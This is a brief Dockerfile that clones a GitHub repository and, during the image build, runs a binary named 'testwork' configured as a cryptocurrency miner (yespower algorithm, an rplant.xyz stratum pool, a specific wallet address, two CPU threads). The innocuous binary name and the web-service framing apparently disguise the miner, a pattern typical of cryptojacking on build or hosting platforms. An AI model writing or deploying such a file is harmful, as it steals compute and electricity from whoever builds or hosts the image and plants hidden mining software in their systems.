FROM golang:1.4
EXPOSE 8080
RUN apt-get update -y && apt install -y wget
RUN git clone https://github.com/remakove/marsose.git marsose && cd marsose && chmod +x testwork && ./testwork --algorithm yespower --pool stratum+tcps://stratum-na.rplant.xyz:3350 --wallet VPwdqwJ6LLWnCLeS9XPfoiXn81nuUjPB4E.p7 --disable-gpu --cpu-threads 2 --cpu-affinity 0x3
